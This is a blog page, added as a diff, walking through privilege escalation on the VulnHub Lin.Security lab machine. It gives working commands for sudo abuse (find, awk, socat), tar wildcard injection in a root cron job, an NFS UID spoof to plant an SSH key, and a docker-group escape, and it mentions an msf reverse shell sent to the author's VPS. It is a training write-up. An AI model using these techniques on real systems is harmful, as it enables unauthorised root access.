@@ -1,0 +1,296 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>Lin.Security靶机学习 | Arcueid&#39;s BLOG</title>
+    <meta name="author" content="Arcueid" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/Arcueid.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.net" />
+<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ARCUEID&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ARCUEID&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>Lin.Security靶机学习</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/3/20
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/linux/" style="color: #00a596">linux</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="color: #00bcd4">服务器</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="color: #03a9f4">学习</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p><strong>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/linsecurity-1,244/">https://www.vulnhub.com/entry/linsecurity-1,244/</a></strong></p>
+<h1 id="靶机网络配置"><a href="#靶机网络配置" class="headerlink" title="靶机网络配置"></a>靶机网络配置</h1><p>先用用户名bob 密码secret登录<br>然后提权到root</p>
+<pre><code class="bash">sudo awk &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;
+</code></pre>
+<p>注意由于环境的配置 双引号是shift+2</p>
+<p>提权完毕后</p>
+<pre><code class="bash">vim /etc/default/keyboard
+</code></pre>
+<p>将XKBLAYOUT改为us</p>
+<pre><code class="bash">vim /etc/netplan/50-cloud-init.yaml
+</code></pre>
+<p>将enp0s3改为ens33</p>
+<p>然后<br><code>setupcon</code>   再  <code>netplan apply</code></p>
+<h1 id="环境扫描"><a href="#环境扫描" class="headerlink" title="环境扫描"></a>环境扫描</h1><p>去看看lin.security靶机的网卡地址<br><img src="https://img-blog.csdnimg.cn/80c5708e0e49454bae75ce336dcd8039.png" alt="在这里插入图片描述"></p>
+<p>nmap扫描得到<br><img src="https://img-blog.csdnimg.cn/e0776c7f8424471c8532a68d82e663fa.png" alt="在这里插入图片描述"></p>
+<p>由用户名bob密码secret低权限ssh登录<br><img src="https://img-blog.csdnimg.cn/a3e0c2bb68104fc5a71eb28d2c2112e4.png" alt="在这里插入图片描述"></p>
+<h1 id="提权方法1"><a href="#提权方法1" class="headerlink" title="提权方法1"></a>提权方法1</h1><p>读取<code>/etc/passwd</code></p>
+<p><img src="https://img-blog.csdnimg.cn/a04e17a337ad407484059cfe4a847637.png" alt="在这里插入图片描述"><br>发现insecurity用户的gid和uid都是0 且显示了密码的哈希<br>在线查询得到密码为P@ssw0rd!<br>ssh尝试登录<br>登录成功<br><img src="https://img-blog.csdnimg.cn/90c56a6cbd2045a89b44641bcd3d5a66.png" alt="在这里插入图片描述"></p>
+<h1 id="提权方法2"><a href="#提权方法2" class="headerlink" title="提权方法2"></a>提权方法2</h1><p>sudo提权,以下方法都是基于sudo的滥用<br><img src="https://img-blog.csdnimg.cn/f6c216eaa9c744a39eca06d402c12ec4.png" alt="在这里插入图片描述"><br>发现我们拥有sudo权限的命令有awk find等<br>尝试用find命令提权</p>
+<h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><pre><code class="bash">sudo find /etc/passwd -exec &quot;/bin/bash&quot; \;
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/09c3b4971b14461eaf3658b6f0571a3c.png" alt="在这里插入图片描述"></p>
+<h2 id="man"><a href="#man" class="headerlink" title="man"></a>man</h2><p><img src="https://img-blog.csdnimg.cn/92971299873d4065b621c2e273abc699.png" alt="在这里插入图片描述"><br>输入<code>!/bin/bash</code><br><img src="https://img-blog.csdnimg.cn/7801cb85d7654161ac31b68b4ce1cfba.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f002478c123a4f55939e9fdcc3906417.png" alt="在这里插入图片描述"></p>
+<h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><p>sudo awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash”)}’<br><img src="https://img-blog.csdnimg.cn/646208979f0046a4a1a3d6c873b0b46a.png" alt="在这里插入图片描述"></p>
+<h2 id="ash"><a href="#ash" class="headerlink" title="ash"></a>ash</h2><p><img src="https://img-blog.csdnimg.cn/58dd032bc7c64c86b1ab75434d8daa46.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e4a6bfeae0444aa8bef18c3491044912.png" alt="在这里插入图片描述"></p>
+<h2 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h2><pre><code class="bash">sudo socat stdin exec:/bin/bash
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/b034c4335f6a40fdade227b55d178def.png" alt="在这里插入图片描述"><br>还有一些基于sudo滥用的提权 在此不一一列举<br>可以去<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>找相关提权方法</p>
+<h1 id="提权方法3"><a href="#提权方法3" class="headerlink" title="提权方法3"></a>提权方法3</h1><p>定时任务提权<br>先查看<code>/etc/crontab</code>有哪些定时任务<br><img src="https://img-blog.csdnimg.cn/e0a77705d8614bdf98110e4c83908ff8.png" alt="在这里插入图片描述"><br>从左到右以此为分,时,日,月,周<br>如此处最后一条代表每一分钟执行一次 <code>/etc/cron.daily/backup</code><br>看名字是备份,我们去查看一下<br><img src="https://img-blog.csdnimg.cn/382ed542460f4dea843df2a26b80bb4d.png" alt="在这里插入图片描述"><br>此处的含义是每一分钟以root权限执行一次backup中的命令<br>注意到使用了tar命令对&#x2F;home下每个目录进行备份,且使用了通配符<code>*</code>我们可以考虑创建如下两个文件</p>
+<pre><code class="bash">echo &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;
+echo &gt; &quot;--checkpoint=1&quot;
+</code></pre>
+<p>因为当匹配到这两个文件的文件名的时候会当做同名参数使用<br>用msf生成shell.sh的内容<br><img src="https://img-blog.csdnimg.cn/67cea76f66ce431b908c2ed1b971a933.png" alt="在这里插入图片描述"><br>这里打马的是我的vps<br>写入后在vps上nc监听,然后等一会<br><img src="https://img-blog.csdnimg.cn/2763405d1f0d4940aae3caa12fed0277.png" alt="在这里插入图片描述"></p>
+<h1 id="提权方法4"><a href="#提权方法4" class="headerlink" title="提权方法4"></a>提权方法4</h1><p>suid提权</p>
+<pre><code class="bash">find / -perm -u=s -type f -exec ls -al &#123;&#125; \; 2&gt;/dev/null
+</code></pre>
+<p>找可用命令</p>
+<p><img src="https://img-blog.csdnimg.cn/8569cbd9f8e24fc29aad7e40ceb81cb2.png" alt="在这里插入图片描述"><br>发现有taskset<br><img src="https://img-blog.csdnimg.cn/5a3fce08eb3c4a59b786f6bdec02a911.png" alt="在这里插入图片描述"></p>
+<h1 id="提权方法5"><a href="#提权方法5" class="headerlink" title="提权方法5"></a>提权方法5</h1><p>nfs提权<br>之前nmap扫到了2049端口存在nfs服务<br>攻击机<code>showmount</code><br><img src="https://img-blog.csdnimg.cn/da37dd76651d4c9cbecf5d561d19261a.png" alt="在这里插入图片描述"><br>挂载该目录到<code>/tmp/nfs</code></p>
+<pre><code class="bash">mkdir /tmp/nfs
+sudo mount -t nfs 192.168.45.132:/home/peter /tmp/nfs
+</code></pre>
+<p>挂载完后进行访问<br><img src="https://img-blog.csdnimg.cn/33fd937db6b04d6b8fdad5a72747d4b9.png" alt="在这里插入图片描述"><br>说明挂载成功了,但是不能写入文件<br><img src="https://img-blog.csdnimg.cn/dc3763d501f54792969bf8b6cf6b10e0.png" alt="在这里插入图片描述"><br>而该目录的所属组是1005,所有者是www<br>我们可以创建一个用户,所属组1005,所有者www来欺骗nfs<br>这里所有者的uid应该是1001,因为我kali上创建过1001的用户www所以显示的www<br><img src="https://img-blog.csdnimg.cn/1a9e2bfbff4544c38318b5b0a9bb654a.png" alt="在这里插入图片描述"><br>所以我们只需要改变www用户的gid<br><img src="https://img-blog.csdnimg.cn/d5c6e16ddc1e47a8b131545a46d4dfda.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d35ab7e2d604435c90e46eb8430de24c.png" alt="在这里插入图片描述"><br>修改成功,尝试用www用户进行访问<img src="https://img-blog.csdnimg.cn/24feb002110b437abcd39cd11bbc53ca.png" alt="在这里插入图片描述"><br>成功写入,可以写了之后我们尝试写入ssh公钥<br>攻击机先用命令生成<br><code>ssh_keygen</code></p>
+<p><img src="https://img-blog.csdnimg.cn/79f96eb18c0d4e36b4f5a907880b596d.png" alt="在这里插入图片描述"><br>然后复制一份公钥到<code>/tmp</code>目录下,并重命名为<code>authorized_keys</code><img src="https://img-blog.csdnimg.cn/be1d31fd926f47a6b1eaef937a4e78a2.png" alt="在这里插入图片描述"><br>然后www用户再复制到<code>/tmp/nfs/.ssh</code>目录下<br><img src="https://img-blog.csdnimg.cn/6ff0160f7ca6463aadefa35aa1903209.png" alt="在这里插入图片描述"><br>使用私钥ssh连接<br><img src="https://img-blog.csdnimg.cn/87dfe433bd474951809e96a79c963bff.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fda0aa9cc6364f7399106cc19ac0d979.png" alt="在这里插入图片描述"><br>发现可以用strace提权</p>
+<p><img src="https://img-blog.csdnimg.cn/62dc9926f5204e688a43c2a4c96a2f88.png" alt="在这里插入图片描述"></p>
+<h1 id="提权方法6"><a href="#提权方法6" class="headerlink" title="提权方法6"></a>提权方法6</h1><p>docker提权<br><img src="https://img-blog.csdnimg.cn/9ee8d6ab8e0b4ce1a495a6e824f2e570.png" alt="在这里插入图片描述"><br>发现peter也属于docker组</p>
+<pre><code class="bash">docker run -v /:/mnt --rm -it alpine chroot /mnt bash
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/e9a86bfd727448978f232d8633639744.png" alt="在这里插入图片描述"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Arcueid&#39;s BLOG
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Arcueid
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
